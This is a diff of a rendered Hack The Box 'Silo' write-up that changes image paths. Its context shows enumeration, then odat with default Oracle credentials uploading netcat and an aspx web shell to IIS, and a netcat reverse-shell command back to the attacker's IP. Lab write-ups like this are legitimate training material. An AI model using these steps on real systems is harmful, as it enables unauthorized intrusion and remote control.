@@ -82,7 +82,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 145.51 seconds
 </code></pre><ul><li><code>smb</code></li></ul><pre tabindex=0><code>└─$ smbclient -N -L //10.10.10.82     
 session setup failed: NT_STATUS_ACCESS_DENIED
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.82/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error    
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/silo/images/1.png></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.82/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error    
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -229,7 +229,7 @@ SYS                            XDB_WEBSERVICES_OVER_HTTP      YES YES NO
 SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO
 
 32 rows selected.
-</code></pre><ul><li><a href=https://github.com/quentinhardy/odat target=_blank rel=noopener>odat&rsquo;s mind map</a></li></ul><p><img src=./images/2.png></p><ul><li>We can try using <code>utlfile</code> and <code>externaltable</code> to upload <code>binary</code> and get reverse shell (but with no arguments)<ul><li>Or we can upload <code>aspx</code> and <code>nc</code> files via <code>utlfile</code> and get web shell</li></ul></li></ul><pre tabindex=0><code>└─$ odat utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile &#39;C:\inetpub\wwwroot&#39; nc.exe ~/Documents/Tools/nc64.exe
+</code></pre><ul><li><a href=https://github.com/quentinhardy/odat target=_blank rel=noopener>odat&rsquo;s mind map</a></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/silo/images/2.png></p><ul><li>We can try using <code>utlfile</code> and <code>externaltable</code> to upload <code>binary</code> and get reverse shell (but with no arguments)<ul><li>Or we can upload <code>aspx</code> and <code>nc</code> files via <code>utlfile</code> and get web shell</li></ul></li></ul><pre tabindex=0><code>└─$ odat utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile &#39;C:\inetpub\wwwroot&#39; nc.exe ~/Documents/Tools/nc64.exe
 
 [1] (10.10.10.82:1521): Put the /home/kali/Documents/Tools/nc64.exe local file in the C:\inetpub\wwwroot folder like nc.exe on the 10.10.10.82 server                                                                                       
 [+] The /home/kali/Documents/Tools/nc64.exe file was created on the C:\inetpub\wwwroot directory on the 10.10.10.82 server like the nc.exe file
@@ -237,7 +237,7 @@ SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO
 
 [1] (10.10.10.82:1521): Put the /usr/share/webshells/aspx/cmdasp.aspx local file in the C:\inetpub\wwwroot folder like shell.aspx on the 10.10.10.82 server                                                                                 
 [+] The /usr/share/webshells/aspx/cmdasp.aspx file was created on the C:\inetpub\wwwroot directory on the 10.10.10.82 server like the shell.aspx file
-</code></pre><ul><li>Now let&rsquo;s get reverse shell<ul><li><code>c:\inetpub\wwwroot\nc.exe 10.10.16.9 6666 -e cmd</code></li></ul></li></ul><p><img src=./images/3.png></p><h2 id=root>Root</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>c:\windows\system32\inetsrv&gt;whoami
+</code></pre><ul><li>Now let&rsquo;s get reverse shell<ul><li><code>c:\inetpub\wwwroot\nc.exe 10.10.16.9 6666 -e cmd</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/silo/images/3.png></p><h2 id=root>Root</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>c:\windows\system32\inetsrv&gt;whoami
 whoami
 iis apppool\defaultapppool
 
@@ -325,7 +325,7 @@ https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0
 
 link password:
 �%Hm8646uC$
-</code></pre><p><img src=./images/4.png></p><ul><li>The password has a weird symbol<ul><li>I downloaded it to my box and its <code>£%Hm8646uC$</code></li><li><code>vim</code> can see it<ul><li>But had to install <code>vim-gtk3</code></li><li>And used <code>"+y</code> after selecting the block in visual mode</li></ul></li></ul></li></ul><p><img src=./images/5.png></p><p><img src=./images/6.png></p><ul><li>It&rsquo;s a memory dump<ul><li>We need <code>systeminfo</code></li></ul></li></ul><pre tabindex=0><code>c:\Users&gt;systeminfo
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/silo/images/4.png></p><ul><li>The password has a weird symbol<ul><li>I downloaded it to my box and its <code>£%Hm8646uC$</code></li><li><code>vim</code> can see it<ul><li>But had to install <code>vim-gtk3</code></li><li>And used <code>"+y</code> after selecting the block in visual mode</li></ul></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/silo/images/5.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/windows/silo/images/6.png></p><ul><li>It&rsquo;s a memory dump<ul><li>We need <code>systeminfo</code></li></ul></li></ul><pre tabindex=0><code>c:\Users&gt;systeminfo
 systeminfo
 
 Host Name:                 SILO
